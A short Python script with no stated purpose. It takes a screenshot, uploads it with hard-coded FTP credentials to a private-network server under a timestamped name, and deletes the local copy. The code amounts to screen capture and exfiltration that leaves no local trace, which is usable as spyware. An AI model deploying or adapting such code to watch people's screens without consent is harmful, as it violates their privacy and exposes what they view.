import pyautogui, time, os
from ftplib import FTP

date = time.strftime('%X')
 
# Take screenshot
pic = pyautogui.screenshot()
 
# Save the image
file = pic.save('Screenshot.png') 

ftp = FTP('10.101.200.40')
ftp.login("quentin","deborde")

fileName = "Screenshot.png"
file = open(fileName,'rb')              
ftp.storbinary('STOR ' + date + "_" +fileName, file) 
file.close()
os.remove(fileName)